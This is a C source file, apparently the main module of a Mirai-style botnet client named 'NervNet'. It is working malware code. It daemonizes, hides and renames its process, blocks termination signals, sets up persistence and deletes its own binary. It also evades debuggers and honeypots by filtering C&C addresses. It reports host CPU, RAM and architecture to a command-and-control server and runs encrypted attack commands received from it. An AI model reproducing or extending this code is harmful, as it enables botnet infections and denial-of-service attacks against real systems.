#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <netinet/in.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "tcp.h"
#include "attack.h"
#include "killer.h"
#include "util.h"
#include "resolv.h"
#ifdef ENS
#include "ens.h"
#endif
#include "persistence.h"
#include "stealth.h"
#include "chacha20.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
extern struct sockaddr_in srv_addr;
#ifdef RELAY_MODE
static void resolve_relay_addr(void)
{
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(RELAY_PORT);

    table_unlock_val(TABLE_RELAY_1);
    char *domain = table_retrieve_val(TABLE_RELAY_1, NULL);
    
    if (domain == NULL || util_strlen(domain) == 0)
    {
        table_lock_val(TABLE_RELAY_1);
        return;
    }
    
    struct resolv_entries *entries = NULL;
    int retries = 3;
    
    while (retries > 0 && entries == NULL)
    {
        entries = resolv_lookup(domain);
        if (entries == NULL)
        {
            retries--;
            if (retries > 0)
                sleep(2);
        }
    }
    
    table_lock_val(TABLE_RELAY_1);
    
    if (entries == NULL)
        return;
    
    srv_addr.sin_addr.s_addr = entries->addrs[0];
    resolv_entries_free(entries);
}
#endif

static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
BOOL pending_auth = FALSE;  
time_t connect_start_time = 0;  
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
ipv4_t LOCAL_ADDR;
char bot_arch[32];


static chacha20_ctx enc_ctx;
static BOOL encryption_initialized = FALSE;



static const uint8_t ENCRYPTION_KEY[32] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
};



static uint8_t encryption_nonce[12] = {0};



#define SERVER_AUTH_MAGIC_0  0x4A
#define SERVER_AUTH_MAGIC_1  0x8F
#define SERVER_AUTH_MAGIC_2  0x2C
#define SERVER_AUTH_MAGIC_3  0xD1



static BOOL is_suspicious_ip(ipv4_t ip) {
    uint8_t o1 = (ip >> 24) & 0xff;
    uint8_t o2 = (ip >> 16) & 0xff;
    uint8_t o3 = (ip >> 8) & 0xff;
    uint8_t o4 = ip & 0xff;
    
    
    if (o1 == 127) return TRUE;
    
    
    if (o1 == 10) return TRUE;  
    if (o1 == 192 && o2 == 168) return TRUE;  
    if (o1 == 172 && o2 >= 16 && o2 < 32) return TRUE;  
    
    
    if (o1 >= 224) return TRUE;
    
    
    if (o1 == 0) return TRUE;
    
    
    if (o1 == 100 && o2 >= 64 && o2 < 127) return TRUE;  
    if (o1 == 169 && o2 == 254) return TRUE;  
    if (o1 == 198 && o2 >= 18 && o2 < 20) return TRUE;  
    
    
    
    if (o1 == 185 && o2 == 86 && o3 == 148) return TRUE;  
    if (o1 == 45 && o2 == 33 && o3 == 32) return TRUE;   
    if (o1 == 192 && o2 == 0 && o3 == 2) return TRUE;    
    
    return FALSE;
}




static BOOL validate_response_timing(time_t connect_time, time_t auth_time) {
    if (connect_time == 0 || auth_time == 0) return TRUE;  
    
    time_t elapsed = auth_time - connect_time;
    
    
    
    if (elapsed < 0) return FALSE;  
    
    
    
    
    if (elapsed > 30) return FALSE;
    
    
    
    
    return TRUE;
}


static int connection_attempts = 0;
static time_t last_connection_time = 0;
static BOOL has_authenticated_once = FALSE;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[main/err] got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif

volatile sig_atomic_t is_defending = 0;
void handle_signal(int signum) {
    is_defending = 1;
}

void defend_binary() {
    
    signal(SIGTERM, handle_signal);
    signal(SIGINT, handle_signal);
    signal(SIGKILL, handle_signal);
    signal(SIGQUIT, handle_signal);
    signal(SIGTSTP, handle_signal);  
    signal(SIGTTIN, handle_signal);  
    signal(SIGTTOU, handle_signal);  
    signal(SIGHUP, handle_signal);
}

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define LOCALHOST (INET_ADDR(127,0,0,1))
uint32_t LOCAL_ADDR2;
#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))



void ensure() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        #ifdef DEBUG
            printf("[main/ensure] error creating socket for esi port\n");
        #endif
        exit(1);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        #ifdef DEBUG
            printf("[main/ensure] another instance is already running\n");
        #endif
        close(sockfd);
        exit(1);
        return;
    }

    #ifdef DEBUG
        printf("[main/ensure] no other instance detected, joining botnet\n");
    #endif
}

void hide_process_from_proc() {
    int pid = getpid();
    char new_dir_path[256];
    snprintf(new_dir_path, sizeof(new_dir_path), "/proc/%d", pid);

    rename("/proc/self", new_dir_path);
}

#define MAX_CMDLINE_LENGTH 256
void hide_process() {
    int fd;
    int pid = getpid();
    const char* charset = "abcdefghijklmnopqrstuvwxyz";
    char cmdline_name[MAX_CMDLINE_LENGTH];
    for (int i = 0; i < 10; i++) {
        int index = rand() % strlen(charset);
        cmdline_name[i] = charset[index];
    }
    cmdline_name[10] = '\0';

    char cmd_path[64];
    snprintf(cmd_path, sizeof(cmd_path), "/proc/%d/cmdline", pid);
    fd = open(cmd_path, O_WRONLY);
    if (write(fd, cmdline_name, strlen(cmdline_name)) == -1) {
        #ifdef DEBUG
            printf("[main] failed to hide cmdline name, continuing anyway\n");
        #endif
    }
}

int main(int argc, char **args)
{
    if(setpgid(0, 0) == -1) {
        #ifdef DEBUG
            printf("[main] failed to create process group, continuing anyway\n");
        #endif
    } else {
        #ifdef DEBUG
            printf("[main] created new process group\n");
        #endif
    }


    #ifdef DEBUG
        printf("NervNet debug mode\n");
    #endif

    #ifndef DEBUG
        pid_t pppid = fork();
        if (pppid < 0) {
            return 0;
        }
        
        if (pppid > 0) {
            return 0;
        }

        if (setsid() < 0) {
            return 0;
        }
        close(STDIN);
        close(STDOUT);
        close(STDERR);
    #endif

    ensure();
    char *tbl_exec_succ, id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0, i;
    uint8_t name_buf[32];

    hide_process_from_proc();
    hide_process();
    defend_binary();

    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);

    #ifdef DEBUG
        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");

        
        signal(SIGTSTP, exit);
    #endif

    table_init();
    anti_gdb_entry(0);
    util_zero(id_buf, 32);
    util_zero(bot_arch, 32);

    struct utsname name;
    if (uname(&name) == 0)
    {
        util_strcpy(bot_arch, name.machine);
        util_strcpy(id_buf, name.machine);
    }

    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    rand_init();

    
    #ifndef DEBUG
    stealth_hide_process_name();
    #else
    util_strcpy(args[0], "httpd");
    prctl(PR_SET_NAME, "httpd");
    #endif

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);

    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    attack_init();

    
    #ifndef DEBUG
    persistence_init();
    persistence_watchdog_start(); 
    #endif

    #ifdef KILLER
        killer_init();
        locker_init();
    #endif

    char self_exe[4096];
    readlink("/proc/self/exe", self_exe, sizeof(self_exe));
    
    
    const char *persistent = get_persistent_path();
    if (persistent != NULL) {
        
    if (unlink(self_exe) != 0) {
        #ifdef DEBUG
            printf("[main] failed to unlink self, continuing anyway\n");
            #endif
        }
        
        #ifndef DEBUG
        stealth_unlink_exe();
        #endif
    } else {
        
        #ifdef DEBUG
            printf("[main] persistence not set up, keeping original file\n");
        #endif
    }

    while (TRUE) {
        
        #ifndef DEBUG
        stealth_rotate_name();
        
        
        if (stealth_check_debugger()) {
            
            _exit(1);
        }
        
        
        persistence_check_health();
        #endif
        
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1) {
            #ifdef DEBUG
                printf("[main/conn]: select() (errno: %d)\n", errno);
            #endif
            
        } else if (nfds == 0) {
            uint16_t len = 0;

            if ((rand() % 6) == 0)
                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        }

        
        if (pending_connection) {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr)) {
                #ifdef DEBUG
                    printf("[main/conn]: timed out while connecting to C&C\n");
                #endif
                teardown_connection();
            } else {
                int err = 0;
                socklen_t err_len = sizeof(err);

                int n = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0 || n != 0) {
                    #ifdef DEBUG
                        printf("[main/conn]: error while connecting to C&C (errno: %d)\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand() % 10) + 1);
                } else {
#ifdef RELAY_MODE
                    // SOCKS5 handshake via relay
                    // Step 1: Send greeting (no auth)
                    unsigned char socks_greeting[] = {0x05, 0x01, 0x00};
                    send(fd_serv, socks_greeting, 3, MSG_NOSIGNAL);
                    
                    // Wait for response
                    unsigned char socks_auth_resp[2];
                    if (recv(fd_serv, socks_auth_resp, 2, MSG_NOSIGNAL) != 2 || socks_auth_resp[0] != 0x05 || socks_auth_resp[1] != 0x00) {
                        teardown_connection();
                        continue;
                    }
                    
                    // Step 2: Send CONNECT request to CNC through relay
                    // We send the relay our actual CNC address (which is the relay's address from the bot's perspective)
                    struct sockaddr_in *cnc_addr = (struct sockaddr_in *)&srv_addr;
                    unsigned char socks_connect[] = {
                        0x05, 0x01, 0x00, 0x01, // CONNECT via IPv4
                        0x00, 0x00, 0x00, 0x00, // IP (placeholder, will be relay IP)
                        0x00, 0x00              // Port (placeholder)
                    };
                    // Copy the relay's IP (the address we connected to)
                    util_memcpy(&socks_connect[4], &cnc_addr->sin_addr.s_addr, 4);
                    socks_connect[8] = (CNC_PORT >> 8) & 0xff;
                    socks_connect[9] = CNC_PORT & 0xff;
                    send(fd_serv, socks_connect, 10, MSG_NOSIGNAL);
                    
                    // Wait for SOCKS5 CONNECT response
                    unsigned char socks_resp[10];
                    if (recv(fd_serv, socks_resp, 10, MSG_NOSIGNAL) != 10 || socks_resp[1] != 0x00) {
                        teardown_connection();
                        continue;
                    }
                    // SOCKS5 handshake complete, now proceed with normal CNC auth
#endif
                    uint8_t id_len = util_strlen(id_buf);
                    time_t connect_time = time(NULL);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x03", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0) {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    uint16_t cores = 1; 
                    FILE *fp = fopen("/proc/cpuinfo", "r");
                    if (fp != NULL) {
                        char line[256];
                        while (fgets(line, sizeof(line), fp)) {
                            if (strncmp(line, "cpu cores", 9) == 0) {
                                char *colon = strchr(line, ':');
                                if (colon != NULL) {
                                    int parsed = atoi(colon + 1);
                                    if (parsed > 0)
                                        cores = (uint16_t) parsed;
                                }
                                break;
                            }
                        }
                        fclose(fp);
                    }

                    
                    struct sysinfo info;
                    uint32_t ram = 0;
                    if (sysinfo(&info) == 0) {
                        ram = (uint32_t)((uint64_t)info.totalram * (uint64_t)info.mem_unit / 1024 / 1024);
                    } else {
                        long pages = sysconf(_SC_PHYS_PAGES);
                        long page_size = sysconf(_SC_PAGE_SIZE);
                        if (pages > 0 && page_size > 0) {
                            ram = (uint32_t)((uint64_t)pages * (uint64_t)page_size / 1024 / 1024);
                        }
                    }

                    
                    uint16_t net_cores = htons(cores);
                    uint32_t net_ram   = htonl(ram);

                    
                    send(fd_serv, &net_cores, sizeof(net_cores), MSG_NOSIGNAL);
                    send(fd_serv, &net_ram,   sizeof(net_ram),   MSG_NOSIGNAL);

                    uint8_t arch_len = util_strlen(bot_arch);
                    send(fd_serv, &arch_len, sizeof(arch_len), MSG_NOSIGNAL);
                    if (arch_len > 0)
                        send(fd_serv, bot_arch, arch_len, MSG_NOSIGNAL);

                    
                    pending_auth = TRUE;
                    
                    connect_start_time = connect_time;

                    #ifdef DEBUG
                        printf("[main/conn]: connected to C&C, waiting for auth (addr: %d)\n", LOCAL_ADDR);
                    #endif
                }
            }
        } else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd)) {
            
            if (pending_auth) {
                uint8_t auth_response[4];
                errno = 0;
                int n = recv(fd_serv, auth_response, 4, MSG_NOSIGNAL | MSG_PEEK);
                
                if (n == 4) {
                    time_t auth_time = time(NULL);
                    
                    
                    if (connect_start_time > 0 && !validate_response_timing(connect_start_time, auth_time)) {
                        #ifdef DEBUG
                            printf("[main/auth]: Suspicious response timing - likely honeypot\n");
                        #endif
                        teardown_connection();
                        continue;
                    }
                    
                    
                    recv(fd_serv, auth_response, 4, MSG_NOSIGNAL);
                    
                    
                    if (auth_response[0] == SERVER_AUTH_MAGIC_0 &&
                        auth_response[1] == SERVER_AUTH_MAGIC_1 &&
                        auth_response[2] == SERVER_AUTH_MAGIC_2 &&
                        auth_response[3] == SERVER_AUTH_MAGIC_3) {
                        
                        pending_auth = FALSE;
                        has_authenticated_once = TRUE;
                        
                        
                        
                        
                        memset(encryption_nonce, 0, 12);
                        memcpy(encryption_nonce, auth_response, 4);  
                        memcpy(encryption_nonce + 4, auth_response, 4);  
                        memcpy(encryption_nonce + 8, auth_response, 4);  
                        
                        chacha20_init(&enc_ctx, ENCRYPTION_KEY, encryption_nonce);
                        encryption_initialized = TRUE;
                        connection_attempts = 0;  
                        #ifdef DEBUG
                            printf("[main/auth]: server authentication successful\n");
                        #endif
                        continue; 
                    } else {
                        
                        #ifdef DEBUG
                            printf("[main/auth]: server authentication failed - disconnecting (honeypot detected)\n");
                        #endif
                        teardown_connection();
                        continue;
                    }
                } else if (n == -1) {
                    if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR) {
                        continue; 
                    } else {
                        #ifdef DEBUG
                            printf("[main/auth]: error reading auth response (errno: %d)\n", errno);
                        #endif
                        teardown_connection();
                        continue;
                    }
                } else if (n == 0) {
                    
                    #ifdef DEBUG
                        printf("[main/auth]: connection closed before authentication\n");
                    #endif
                    teardown_connection();
                    continue;
                } else {
                    
                    continue;
                }
            }
            
            int n;
            uint16_t len;
            char rdbuf[1400];  

            
            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1) {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else {
                    #ifdef DEBUG
                        printf("[main/conn]: lost connection with C&C (errno: %d, stat: 1)\n", errno);
                    #endif
                    teardown_connection();
                }
            }

            
            if (n == 0) {
                #ifdef DEBUG
                    printf("[main/conn]: lost connection with C&C (errno: %d, stat: 1)\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            
            if (len == 0) {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL); 
                continue;
            }
            len = ntohs(len);
            
            #ifdef DEBUG
                printf("[main/conn]: Read length header: %d (0x%04x)\n", len, len);
            #endif
            
            
            if (len > sizeof(rdbuf)) {
                #ifdef DEBUG
                    printf("[main/conn]: received buffer length is too large, closing connection (honeypot?)\n");
                #endif
                close(fd_serv);
                fd_serv = -1;
                continue;
            }
            
            
            
            if (!has_authenticated_once && len > 0) {
                #ifdef DEBUG
                    printf("[main/conn]: Received data before authentication - likely honeypot\n");
                #endif
                teardown_connection();
                continue;
            }

            
            uint16_t len_tmp;
            n = recv(fd_serv, &len_tmp, sizeof(len_tmp), MSG_NOSIGNAL);
            #ifdef DEBUG
                printf("[main/conn]: Consumed length header, recv returned %d bytes\n", n);
                printf("[main/conn]: Will now try to read %d bytes of payload\n", len);
            #endif





            
            int total_read = 0;
            while (total_read < len) {
                n = recv(fd_serv, rdbuf + total_read, len - total_read, MSG_NOSIGNAL);
                if (n <= 0) {
                    #ifdef DEBUG
                        printf("[main/recv]: recv() failed or connection closed (read %d/%d bytes)\n", total_read, len);
                    #endif
                    teardown_connection();
                    break;
                }
                total_read += n;
            }

            if (fd_serv == -1)
                continue;

            #ifdef DEBUG
                printf("[main/conn]: received bytes from C&C (len: %d)\n", len);
                printf("[main/conn]: Encrypted data (first 8 bytes): %02x %02x %02x %02x %02x %02x %02x %02x\n",
                       rdbuf[0], rdbuf[1], rdbuf[2], rdbuf[3], rdbuf[4], rdbuf[5], rdbuf[6], rdbuf[7]);
            #endif

            
            #ifdef DEBUG
                printf("[main/conn]: encryption_initialized = %d\n", encryption_initialized);
            #endif
            if (encryption_initialized && len > 0) {
                uint8_t decrypted_buf[1400];
                chacha20_crypt(&enc_ctx, rdbuf, decrypted_buf, len);
                memcpy(rdbuf, decrypted_buf, len);
                #ifdef DEBUG
                    printf("[main/conn]: Decrypted data (first 8 bytes): %02x %02x %02x %02x %02x %02x %02x %02x\n",
                           rdbuf[0], rdbuf[1], rdbuf[2], rdbuf[3], rdbuf[4], rdbuf[5], rdbuf[6], rdbuf[7]);
                #endif
            } else {
                #ifdef DEBUG
                    printf("[main/conn]: Skipping decryption (encryption_initialized=%d, len=%d)\n", encryption_initialized, len);
                #endif
            }

            
            
            
            
            if (len > 4 && rdbuf[0] == 'H' && rdbuf[1] == 'T' && rdbuf[2] == 'T' && rdbuf[3] == 'P') {
                #ifdef DEBUG
                    printf("[main/conn]: Received HTTP response instead of bot protocol - honeypot detected\n");
                #endif
                teardown_connection();
                continue;
            }

            if (len > 0) {
                if (rdbuf[0] == CNC_OP_KILLSELF) {
                    #ifdef DEBUG
                        printf("[main] Received kill command from CNC - terminating\n");
                    #endif
                    _exit(0);
                }
                attack_parse(rdbuf, len);
            }
        }
    }
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void) {
    struct resolv_entries *entries;
    srv_addr.sin_family = AF_INET;

    table_unlock_val(TABLE_CNC_DOMAIN);
    char *domain = table_retrieve_val(TABLE_CNC_DOMAIN, NULL);
    
    int retries = 3;
    entries = NULL;
    
    while (retries > 0 && entries == NULL) {
#ifdef ENS
    entries = ens_lookup(domain);
#else
    entries = resolv_lookup(domain);
#endif
        if (entries == NULL) {
            #ifdef DEBUG
                printf("[main] Failed to resolve CNC address, retrying...\n");
            #endif
            retries--;
            if (retries > 0) {
                sleep(2); 
            }
        }
    }
    
    if (entries == NULL) {
        #ifdef DEBUG
            printf("[main] Failed to resolve CNC address after retries\n");
        #endif
        return;
    }

    
    BOOL has_valid_ip = FALSE;
    for (int i = 0; i < entries->addrs_len; i++) {
        if (!is_suspicious_ip(entries->addrs[i])) {
            has_valid_ip = TRUE;
            break;
        }
    }
    
    if (!has_valid_ip) {
        #ifdef DEBUG
            printf("[main] All resolved IPs are suspicious (honeypot?) - aborting\n");
        #endif
        resolv_entries_free(entries);
        return;  
    }

    ipv4_t selected_ip = entries->addrs[rand_next() % entries->addrs_len];
    
    
    if (is_suspicious_ip(selected_ip)) {
        #ifdef DEBUG
            printf("[main] Selected IP is suspicious, finding valid IP\n");
        #endif
        
        BOOL found_valid = FALSE;
        for (int i = 0; i < entries->addrs_len; i++) {
            if (!is_suspicious_ip(entries->addrs[i])) {
                selected_ip = entries->addrs[i];
                found_valid = TRUE;
                break;
            }
        }
        if (!found_valid) {
            #ifdef DEBUG
                printf("[main] Could not find valid IP - aborting\n");
            #endif
            resolv_entries_free(entries);
            return;
        }
    }
    
    srv_addr.sin_addr.s_addr = selected_ip;
    resolv_entries_free(entries);
    srv_addr.sin_port = htons(CNC_PORT);

    table_lock_val(TABLE_CNC_DOMAIN);

    #ifdef DEBUG
        printf("[main] Resolved domain to valid IP\n");
    #endif
}

static void establish_connection(void)
{
    
    time_t now = time(NULL);
    if (last_connection_time > 0 && (now - last_connection_time) < 2) {
        connection_attempts++;
        
        if (connection_attempts > 5) {
            #ifdef DEBUG
                printf("[main/conn]: Too many rapid connection attempts, delaying\n");
            #endif
            sleep(5);
            connection_attempts = 0;
        }
    } else {
        connection_attempts = 0;
    }
    last_connection_time = now;
    
    #ifdef DEBUG
        printf("[main/conn]: attempting to connect to cnc\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main/conn]: failed to call socket() (errno: %d)\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
    
#ifdef RELAY_MODE
    resolve_relay_addr();
    
    // If relay resolution fails, try the CNC domain as fallback
    if (srv_addr.sin_addr.s_addr == 0)
    {
        #ifdef DEBUG
            printf("[main] Relay resolution failed, falling back to CNC domain\n");
        #endif
        resolve_cnc_addr();
    }
#else
    resolve_cnc_addr();
#endif
    
    if (resolve_func != NULL)
        resolve_func();

    
    if (is_suspicious_ip(srv_addr.sin_addr.s_addr)) {
        #ifdef DEBUG
            printf("[main/conn]: Refusing to connect to suspicious IP\n");
        #endif
        close(fd_serv);
        fd_serv = -1;
        return;
    }

#ifndef RELAY_MODE
    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
#else
    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
#endif
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main/teardown]: tearing down connection to C&C!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    pending_auth = FALSE;  
    has_authenticated_once = FALSE;  
    connect_start_time = 0;  
    encryption_initialized = FALSE;  
    
    
    sleep((rand() % 3) + 1);
}
